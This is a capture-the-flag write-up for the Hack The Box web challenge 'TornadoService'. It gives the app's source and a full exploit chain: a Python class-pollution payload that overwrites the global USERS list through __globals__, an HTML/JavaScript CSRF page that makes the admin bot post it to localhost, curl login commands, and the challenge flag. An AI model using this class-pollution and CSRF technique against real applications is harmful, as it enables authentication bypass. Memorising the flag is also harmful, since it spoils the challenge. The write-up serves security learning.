# Web

## Description

You have found a portal of the recently arising tornado malware, it appears to have some protections implemented but a bet was made between your peers that they are not enough. Will you win this bet?

URL: [https://app.hackthebox.com/challenges/TornadoService](https://app.hackthebox.com/challenges/TornadoService)
## Source

`main.py`
```python
import os, json

import tornado.web

from application.util.general import generate, json_response, is_valid_url, is_request_from_localhost, update_tornados, read_file_contents, random_ip, random_hostname, random_status
from application.util.bot import bot_thread

class TornadoObject:
	def __init__(self, machine_id, ip_address, status):
		self.machine_id = machine_id
		self.ip_address = ip_address
		self.status = status

	def serialize(self):
		return vars(self)

class BaseHandler(tornado.web.RequestHandler):
	def set_default_headers(self):
		self.set_header("Access-Control-Allow-Origin", "*")
		self.set_header("Access-Control-Allow-Methods", "GET,POST,PUT,DELETE,OPTIONS")
		self.set_header("Access-Control-Allow-Headers", "Content-Type, Authorization, x-requested-with")

	def write_error(self, status_code, **kwargs):
		self.set_header("Content-Type", "application/json")
		if "exc_info" in kwargs:
			exception = kwargs["exc_info"][1]
			message = exception.log_message if hasattr(exception, "log_message") else str(exception)
		else:
			message = self._reason
		
		self.finish(json_response(message, self.__class__.__name__, error=True))

class NotFoundHandler(BaseHandler):
	def prepare(self):
		self.set_status(404)
		self.write_error(404)

class IndexHandler(BaseHandler):
	def get(self):
		self.render("templates/index.html")

class GetTornadosHandler(BaseHandler):
	def initialize(self, tornados):
		self.tornados = tornados

	def get(self):
		self.set_header("Content-Type", "application/json")
		self.write(json.dumps([tornado.serialize() for tornado in self.tornados]))
			
class UpdateTornadoHandler(BaseHandler):
	def initialize(self, tornados):
		self.tornados = tornados

	def post(self):
		self.set_header("Content-Type", "application/json")
		if not is_request_from_localhost(self):
			self.set_status(403)
			self.write(json_response("Only localhost can update tornado status.", "Forbidden", error=True))
			return

		try:
			data = json.loads(self.request.body)
			machine_id = data.get("machine_id")

			for tornado in self.tornados:
				if tornado.machine_id == machine_id:
					update_tornados(data, tornado)
					self.write(json_response(f"Status updated for {machine_id}", "Update"))
					return

			self.set_status(404)
			self.write(json_response("Machine not found", "Not Found", error=True))
		except json.JSONDecodeError:
			self.set_status(400)
			self.write(json_response("Invalid JSON", "Bad Request", error=True))

class ReportTornadoHandler(BaseHandler):
	def initialize(self, tornados):
		self.tornados = tornados

	def get(self):
		self.set_header("Content-Type", "application/json")
		ip_param = self.get_argument("ip", None)
		tornado_url = f"http://{ip_param}/agent_details"
		if ip_param and is_valid_url(tornado_url):
			bot_thread(tornado_url)
			self.write(json_response(f"Tornado: {ip_param}, has been reported", "Reported"))
		else:
			self.set_status(400)
			self.write(json_response("IP parameter is required", "Bad Request", error=True))

class LoginHandler(BaseHandler):
	def post(self):
		self.set_header("Content-Type", "application/json")
		try:
			data = json.loads(self.request.body)
			username = data.get("username")
			password = data.get("password")

			for user in USERS:
				if user["username"] == username and user["password"] == password:
					self.set_secure_cookie("user", username)
					self.write(json_response("Login successful", "Login"))
				else:
					self.set_status(401)
					self.write(json_response("Invalid credentials", "Unauthorized", error=True))
				
				break

		except json.JSONDecodeError:
			self.set_status(400)
			self.write(json_response("Invalid JSON", "Bad Request", error=True))

class ProtectedContentHandler(BaseHandler):
	def get_current_user(self):
		return self.get_secure_cookie("user")

	def get(self):
		self.set_header("Content-Type", "application/json")
		if not self.current_user:
			self.set_status(401)
			self.write(json_response("Unauthorized access", "Unauthorized", error=True))
			return
		
		flag = read_file_contents("/flag.txt")
		self.write(json_response(flag, "Success"))

def make_app():
	settings = {
		"static_path": os.path.join(os.path.dirname(__file__), "static"),
		"cookie_secret": generate(32),
		"default_handler_class": NotFoundHandler,
		"autoreload": True
	}

	return tornado.web.Application([
		(r"/", IndexHandler),
		(r"/get_tornados", GetTornadosHandler, dict(tornados=TORNADOS)),
		(r"/update_tornado", UpdateTornadoHandler, dict(tornados=TORNADOS)),
		(r"/report_tornado", ReportTornadoHandler, dict(tornados=TORNADOS)),
		(r"/login", LoginHandler),
		(r"/stats", ProtectedContentHandler),
		(r".*", NotFoundHandler),
	], **settings)

TORNADOS = [
	TornadoObject(machine_id=random_hostname(), ip_address=random_ip(), status=random_status()),
    TornadoObject(machine_id=random_hostname(), ip_address=random_ip(), status=random_status()),
    TornadoObject(machine_id=random_hostname(), ip_address=random_ip(), status=random_status()),
    TornadoObject(machine_id=random_hostname(), ip_address=random_ip(), status=random_status()),
    TornadoObject(machine_id=random_hostname(), ip_address=random_ip(), status=random_status()),
    TornadoObject(machine_id=random_hostname(), ip_address=random_ip(), status=random_status()),
    TornadoObject(machine_id=random_hostname(), ip_address=random_ip(), status=random_status()),
    TornadoObject(machine_id=random_hostname(), ip_address=random_ip(), status=random_status()),
    TornadoObject(machine_id=random_hostname(), ip_address=random_ip(), status=random_status()),
    TornadoObject(machine_id=random_hostname(), ip_address=random_ip(), status=random_status()),
    TornadoObject(machine_id=random_hostname(), ip_address=random_ip(), status=random_status())
]

USERS = [
	{ "username": "lean@tornado-service.htb", "password": generate(32), },
	{ "username": "xclow3n@tornado-service.htb", "password": generate(32), },
	{ "username": "makelaris@tornado-service.htb", "password": generate(32), }
]

APP = make_app()
```

`util/bot.py`
```python
import time, random, threading
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options

def bot_runner(url):
    chrome_options = Options()

    chrome_options.add_argument("headless")
    chrome_options.add_argument("no-sandbox")
    chrome_options.add_argument("ignore-certificate-errors")
    chrome_options.add_argument("disable-dev-shm-usage")
    chrome_options.add_argument("disable-infobars")
    chrome_options.add_argument("disable-background-networking")
    chrome_options.add_argument("disable-default-apps")
    chrome_options.add_argument("disable-extensions")
    chrome_options.add_argument("disable-gpu")
    chrome_options.add_argument("disable-sync")
    chrome_options.add_argument("disable-translate")
    chrome_options.add_argument("hide-scrollbars")
    chrome_options.add_argument("metrics-recording-only")
    chrome_options.add_argument("no-first-run")
    chrome_options.add_argument("safebrowsing-disable-auto-update")
    chrome_options.add_argument("media-cache-size=1")
    chrome_options.add_argument("disk-cache-size=1")

    client = webdriver.Chrome(options=chrome_options)

    client.get(url)
    time.sleep(10)

    client.quit()

def bot_thread(url):
    thread = threading.Thread(target=bot_runner, args=(url,))
    thread.start()
    return thread
```

`util/general.py`
```python
import os, json, random
from urllib.parse import urlparse

generate = lambda x: os.urandom(x).hex()

def json_response(message, message_type, error=False):
    key = "error" if error else "success"
    return json.dumps({
        key: {
            "type": message_type,
            "message": message
        }
    })

def is_valid_url(url):
    try:
        result = urlparse(url)
        return all([result.scheme, result.netloc])
    except ValueError:
        return False

def is_request_from_localhost(handler):
    if handler.request.remote_ip in ["127.0.0.1", "::1"]:
        return True
    return False

def update_tornados(tornado, updated):
    for index, value in tornado.items():
        if hasattr(updated, "__getitem__"):
            if updated.get(index) and type(value) == dict:
                update_tornados(value, updated.get(index))
            else:
                updated[index] = value
        elif hasattr(updated, index) and type(value) == dict:
            update_tornados(value, getattr(updated, index))
        else:
            setattr(updated, index, value)

def read_file_contents(file_path):
    try:
        with open(file_path, "r") as file:
            contents = file.read()
        return contents
    except FileNotFoundError:
        return f"Error: The file at {file_path} was not found."
    except IOError as e:
        return f"Error: An I/O error occurred. {str(e)}"

def random_ip():
    return f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"

def random_hostname():
    return f"host-{random.randint(1000, 9999)}"

def random_status():
    return random.choice(["active", "inactive"])
```
## Solution

![tornadoservice.png](/assets/ctf/htb/web/tornadoservice.png)

After reviewing the source code the action plan is
1. `/update_tornado` -> Using "Class Pollution" steal user password
2. `/report_tornado` -> Trigger Javascript code for `/update_tornado` 
3. `/login` -> Login...
4. `/stats` -> Profit

First let's play around "Class Pollution" [https://book.hacktricks.xyz/generic-methodologies-and-resources/python/class-pollution-pythons-prototype-pollution](https://book.hacktricks.xyz/generic-methodologies-and-resources/python/class-pollution-pythons-prototype-pollution)

```python
USERS = [{"username": "lean@tornado-service.htb", "password": "ReallyStrongPasswordOrSomething", }]
SOME_VAR = 0

class TornadoObject:
    def __init__(self, machine_id, ip_address, status):
        self.machine_id = machine_id
        self.ip_address = ip_address
        self.status = status

    def serialize(self):
        return vars(self)

def update_tornados(tornado, updated):
    for index, value in tornado.items():
        if hasattr(updated, "__getitem__"):
            if updated.get(index) and type(value) == dict:
                update_tornados(value, updated.get(index))
            else:
                updated[index] = value
        elif hasattr(updated, index) and type(value) == dict:
            update_tornados(value, getattr(updated, index))
        else:
            setattr(updated, index, value)


tornado = TornadoObject(machine_id="host-1122", ip_address="49.115.123.74", status="active")
data = {"__class__": {"__init__": {"__globals__": {"SOME_VAR": 1337}}}}
update_tornados(data, tornado) 
print(SOME_VAR)
# 1337

tornado = TornadoObject(machine_id="host-1122", ip_address="49.115.123.74", status="active")
data = {"__class__": {"__init__": {"__globals__": {"USERS": [{"username": "x", "password": "y"}]}}}}
update_tornados(data, tornado) 
print(USERS)
# [{'username': 'x', 'password': 'y'}]
```

Nice, we have an object which can overwrite the USERS and we will be able to login freely.

Now we need to utilize the bot and make a such request which will trigger CSRF and basically do actions which we want behalf of bot.

Create the CSRF:
```html
<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <title>Document</title>
    </head>
    <body>
        <p>Lorem ipsum dolor sit amet consectetur, adipisicing elit. Ratione alias culpa architecto sint illo quam provident quia iusto hic mollitia, voluptatem laudantium eaque dolore nesciunt. Neque architecto maiores quia inventore!</p>
        <script>
            const url = "http://127.0.0.1:1337/update_tornado";
            const payload = {
                machine_id: 'host-1691', // Make sure it's valid machine ID
                ip_address: '1.2.3.4',   // Just PoC that bot worked
                __class__: {
                    __init__: {
                        __globals__: {
                            USERS: [{ username: "x", password: "y" }]
                        }
                    }
                }
            };

            fetch(url, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(payload),
                mode: "no-cors" // Impotant, will not send OPTIONS request first
            })
        </script>
    </body>
</html>
```

Serve CSRF:

![tornadoservice-2.png](/assets/ctf/htb/web/tornadoservice-2.png)

Trigger CSRF:

![tornadoservice-1.png](/assets/ctf/htb/web/tornadoservice-1.png)

As you can see the host `1691` IP is `1.2.3.4` meaning the exploit worked!

Try to login:
```bash
└─$ curl http://94.237.62.252:46848/login -H 'Content-Type: application/json' -d '{"username": "x", "password":"y"}' -x 127.0.0.1:8080 -i
HTTP/1.1 200 OK
Server: TornadoServer/6.4.1
Content-Type: application/json
Date: Thu, 29 Aug 2024 07:27:02 GMT
Access-Control-Allow-Origin: *
Access-Control-Allow-Methods: GET,POST,PUT,DELETE,OPTIONS
Access-Control-Allow-Headers: Content-Type, Authorization, x-requested-with
Content-Length: 61
Set-Cookie: user="2|1:0|10:1724916422|4:user|4:eA==|7c7ea1256937772fa9b02544d73c46a9dbe1802846b72811dd276b0502d4d5f4"; expires=Sat, 28 Sep 2024 07:27:02 GMT; Path=/
Connection: close

{"success": {"type": "Login", "message": "Login successful"}} 
```

Profit:
```bash
└─$ curl http://94.237.62.252:46848/stats -b 'user="2|1:0|10:1724916422|4:user|4:eA==|7c7ea1256937772fa9b02544d73c46a9dbe1802846b72811dd276b0502d4d5f4"'
{"success": {"type": "Success", "message": "HTB{s1mpl3_stuff_but_w1th_4_tw15t!}"}} 
```

> Flag: `HTB{s1mpl3_stuff_but_w1th_4_tw15t!}`

